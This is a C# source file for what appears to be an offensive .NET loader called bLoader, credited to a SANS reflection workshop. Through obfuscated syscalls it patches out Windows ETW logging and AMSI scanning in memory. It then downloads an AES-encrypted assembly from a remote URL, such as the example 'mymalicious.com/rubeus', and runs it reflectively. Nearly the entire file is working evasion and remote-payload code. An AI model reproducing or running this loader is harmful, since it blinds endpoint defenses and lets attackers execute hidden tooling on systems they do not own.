// inspired by Jean Francois Maes' workshop: https://www.sans.org/webcasts/tech-tuesday-workshop-reflection-in-c/
using System;
using System.Linq;
using System.Reflection;
using System.Net;
using System.Runtime.InteropServices;
using PaupDynamo.Dynamo;
using System.Text;
using System.IO;
using System.Security.Cryptography;

// Use CryptoAES project to encrypt a .NET executable, then serve it over the web and download it using this project
// Uses DInvoke syscalls to patch ETW and AMSI, basic obfuscation applied
namespace bLoader {
	public class Program {

		public static byte[] DownloadContents(string url) {
			//Use TLS 1.2
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
			WebClient c = new WebClient();
			byte[] bs = new byte[] { };

			try {
				bs = c.DownloadData(url);
			} catch (Exception ex) {
				Console.WriteLine(@"Contents could not be fetched. Either the requested file is 
                                    not available or there is no internet connection.\n");
				Console.WriteLine(ex.StackTrace);
				Environment.Exit(0);
			}

			return bs;
		}

		public static void Main(string[] args) {
			string binaryName = AppDomain.CurrentDomain.FriendlyName;

			if (args.Length < 1) {
				Console.WriteLine($"usage: {binaryName} <downloadUrlAesEnc> <arguments>");
				Console.WriteLine($"usage: {binaryName} https://mymalicious.com/rubeus s4u /self /targetdomain:...");

				Environment.Exit(0);
			}

			string url = args[0];

			// 0x001b
			Int32 bee = 0x2a - 0xf;
			// 0x9D - 0xD = 0x90
			byte[] bytesForISMA = new byte[] { 0x31, 0xff, 0x9D - 0xD };

			// DInvoke hash function to get names of methods or libraries without hardcoding them in plaintext
			long key = 0xfaabac01;
			// the AmsiScanBuffer func we don't want to execute
			string badFuncHash = "73AF331B75B91CCEFEDAE340BF0D0FC3";

			// the ETW EtwEventWrite function 
			string badFuncEeTeeDoubleUHash = "EE52EBD396327150E9C6A19010BFBD19";

			// https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
			const int MEMORY_READWRITE = 0x04;

			// 0x48
			byte oEksFowEit = 0x25 + 0x23;
			// 0x33
			byte oEksDirtyTree = 0x30 + 0x3;
			// 0xC0
			byte oEksSeeZero = 0x8E + 0x32;
			// 0xC3
			byte oEksSeeTree = 0xA2 + 0x21;
			byte[] x64Bytes = new byte[] { oEksFowEit, oEksDirtyTree, oEksSeeZero, oEksSeeTree };

			// get bytes to overwrite the EtwEventWrite entry with bytes appropriate for x64
			IntPtr x64BytesLen = (IntPtr)x64Bytes.Length;

			// current process
			IntPtr cProc = (IntPtr)(-1);
			uint oleDirtyProt = 0;
			uint garbage = 0;
			uint status = 1;
			IntPtr sCall = IntPtr.Zero;
			string enteeGuard = "N" + "tPro" + "tectVi" + "rt" + "ualMe" + "mory";

			try {
				IntPtr badEeTeeDoubleU = Generic.GetLibraryAddress("n" + "t" + "d" + "ll" + "." + "d" + "ll", badFuncEeTeeDoubleUHash, key, true);
				sCall = Generic.GetSyscallStub(enteeGuard);
				Native.DELEGATES.NtProtectVirtualMemory sPVM = (Native.DELEGATES.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(sCall, typeof(Native.DELEGATES.NtProtectVirtualMemory));

				//------patch out ETW
				status = sPVM(cProc, ref badEeTeeDoubleU, ref x64BytesLen, MEMORY_READWRITE, ref oleDirtyProt);
				MoveFromHereToThere(badEeTeeDoubleU, x64Bytes);
				status = sPVM(cProc, ref badEeTeeDoubleU, ref x64BytesLen, oleDirtyProt, ref garbage);
				//------patch out ETW

				// si.dll in b64
				string not = "c2kuZGxs";
				byte[] data = Convert.FromBase64String(not);
				string decData = Encoding.UTF8.GetString(data);

				IntPtr badFuncInBadLib = Generic.GetLibraryAddress($"am{decData}", badFuncHash, key, true);
				IntPtr returnieLen = (IntPtr)bytesForISMA.Length;

				//------patch out AMSI
				status = sPVM(cProc, ref badFuncInBadLib, ref returnieLen, MEMORY_READWRITE, ref oleDirtyProt);
				MoveFromHereToThere(badFuncInBadLib + bee, bytesForISMA);
				status = sPVM(cProc, ref badFuncInBadLib, ref returnieLen, oleDirtyProt, ref garbage);
				//------patch out AMSI

				byte[] bs = DownloadContents(url);
				// IMPORTANT: PASSWORD FOR AES DECRYPTION
				byte[] passwordBytes = Encoding.UTF8.GetBytes("fishfish");
				passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
				byte[] bsDec = AES_Decrypt(bs, passwordBytes);

				Assembly puntNet = Assembly.Load(bsDec);
				//Parameters to the binary (skip first parameter as that one is used to pass the remote url to the program)
				Object[] prms = new Object[] { args.Skip(1).ToArray() };
				puntNet.EntryPoint.Invoke(null, prms);
			} catch (Exception ex) {
				// if it dies, it dies
				Console.WriteLine(ex.StackTrace);
				Environment.Exit(0);
			}
			Console.WriteLine();
		}

		public static void MoveFromHereToThere(IntPtr ad, byte[] cmr) {
			int o = 0;
			int len = cmr.Length;

			Marshal.Copy(cmr, o, ad, len);
		}

		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes) {
			byte[] decryptedBytes = null;
			byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

			using (MemoryStream ms = new MemoryStream()) {
				using (RijndaelManaged AES = new RijndaelManaged()) {
					AES.KeySize = 256;
					AES.BlockSize = 128;

					var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);

					AES.Mode = CipherMode.CBC;

					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)) {
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}

			return decryptedBytes;
		}
	}
}
